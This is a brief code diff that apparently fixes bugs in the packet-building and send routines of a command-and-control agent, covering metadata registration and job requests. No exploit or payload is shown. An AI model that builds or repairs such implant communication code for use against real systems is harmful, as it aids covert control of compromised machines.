@@ -17,7 +17,7 @@ pPackage CreatePackage(UINT32 CommandID) {
 	//set request identifier to 1 (first request).
 	pack->RequestID = 1;
 	//set command id to the command used to create the package.
-	pack->CommandID;
+	pack->CommandID = CommandID;
 	//encrypt the data.
 	pack->Encrypt = TRUE;
 	//destroy the package after the package has been sent.
@@ -342,7 +342,7 @@ INT PackageSendMetaDataPackage(pPackage pack, PVOID pResponse, PSIZE_T pSize) {
 	}
 
 	//TODO perform sending of package.
-	if (!(Success = SendRegisterRequest(agent->packages->Buffer, agent->packages->Length))) {
+	if (!(Success = SendRegisterRequest(agent->MetaDataPackage->Buffer, agent->MetaDataPackage->Length))) {
 		return PACKAGE_HAS_NOT_BEEN_SENT_TO_SERVER;
 	}
 
@@ -358,7 +358,7 @@ BOOL PackageSendAll(OUT pDataBuffer Response, OUT PSIZE_T Size)
 	pPackage CurrentPackage = NULL;
 	UINT32 Offset = 0;
 
-	pack = CreatePackageWithMetaData(GET_AGENT_JOB, agent);
+	pack = CreatePackageWithMetaData(GET_AGENT_JOB);
 	//coalesce all waiting packages into one big pacakge.
 	while (AgentPackList)
 	{
